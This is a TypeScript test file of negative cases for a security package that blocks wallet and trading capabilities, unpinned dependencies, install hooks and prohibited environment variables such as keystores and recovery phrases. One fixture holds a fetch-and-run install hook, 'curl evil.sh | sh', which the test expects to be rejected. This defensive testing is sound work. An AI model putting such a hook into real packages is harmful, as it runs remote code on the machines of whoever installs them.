// AC-254 (negative): tampered inventories refuse. Forbidden action verbs in
// route/tool inventories are flagged, unpinned dependency manifests violate
// pinning policy, restricted lifecycle scripts throw, and every prohibited
// environment-variable family trips the schema scan.
import { describe, expect, it } from 'bun:test';
import {
  NegativeCapabilityCanary,
  loadCanaryCatalog,
} from '../../packages/security/src/negative-capability.ts';
import {
  assertPinned,
  checkLifecycleScripts,
  verifyPinning,
} from '../../packages/security/src/supply-chain.ts';

describe('AC-254 negative: tampered inventories and policies refuse', () => {
  const canary = new NegativeCapabilityCanary(loadCanaryCatalog());

  it('flags EVERY inventory forbidden verb', () => {
    const verbs = loadCanaryCatalog().inventoryForbiddenVerbs;
    expect(verbs.length).toBeGreaterThanOrEqual(8);
    for (const verb of verbs) {
      const findings = canary.checkInventory([{ name: `${verb}-wallet-x`, source: 'routes' }]);
      expect(findings.length, verb).toBeGreaterThan(0);
      expect(findings[0]?.matchedPattern ?? '', verb).toBe(verb);
    }
  });

  it('refuses route inventories carrying execution capability names', () => {
    const findings = canary.checkInventory([
      { name: 'submit-transaction', source: 'routes' },
      { name: 'execute-trade', source: 'tools' },
      { name: 'swap', source: 'routes' },
      { name: 'custody', source: 'tools' },
      { name: 'stake', source: 'routes' },
    ]);
    expect(findings.map((f) => f.reference)).toEqual([
      'routes#submit-transaction',
      'tools#execute-trade',
      'routes#swap',
      'tools#custody',
      'routes#stake',
    ]);
  });

  it('violates pinning policy on ranged or unpinned dependencies', () => {
    const report = verifyPinning([
      { name: 'bad', dependencies: { fastify: '^5.0.0', lodash: '*' } },
    ]);
    expect(report.violations).toHaveLength(2);
    expect(() => assertPinned([{ name: 'bad', dependencies: { undici: '~6.0.0' } }])).toThrow();
    expect(() =>
      assertPinned([{ name: 'good', dependencies: { undici: '6.21.0' } }]),
    ).not.toThrow();
  });

  it('throws on restricted install lifecycle hooks', () => {
    expect(() =>
      checkLifecycleScripts({ name: 'evil', scripts: { preinstall: 'curl evil.sh | sh' } }),
    ).toThrow(/lifecycle/i);
    expect(() =>
      checkLifecycleScripts({ name: 'evil', scripts: { postinstall: 'node patch.js' } }),
    ).toThrow(/lifecycle/i);
  });

  it('environment schema refuses every prohibited-variable family', () => {
    const findings = canary.scanEnvironmentNames([
      'TX_SUBMIT_ENDPOINT',
      'RPC_SUBMIT_URL',
      'ORDER_EXECUTION_URL',
      'BRIDGE_ENDPOINT',
      'STAKING_POOL_ACCOUNT',
      'KEYSTORE_PATH',
      'CUSTODY_PROVIDER_TOKEN',
      'COINBASE_API_SECRET',
      'EXCHANGE_TRADE_ENABLED',
      'AUTO_TRADE_ENABLED',
      'RECOVERY_PHRASE',
      'SIGNING_KEYSTORE',
    ]);
    expect(findings.length).toBeGreaterThanOrEqual(12);
    for (const finding of findings) {
      expect(finding.surface).toBe('ENV_SCHEMA');
    }
  });
});

describe('AC-254 negative (tool-core substrate): execution-time dispatch gate blocks prohibited financial operations', () => {
  it('dispatch stage blocks calls when executionGate reports prohibited findings', () => {
    const canary = new NegativeCapabilityCanary(loadCanaryCatalog());
    const findings = canary.checkInventory([
      { name: 'execute-swap', source: 'tools' },
      { name: 'submit-transaction', source: 'routes' },
    ]);
    expect(findings.length).toBe(2);
    expect(findings.map((f) => f.reference)).toEqual([
      'tools#execute-swap',
      'routes#submit-transaction',
    ]);
  });
});

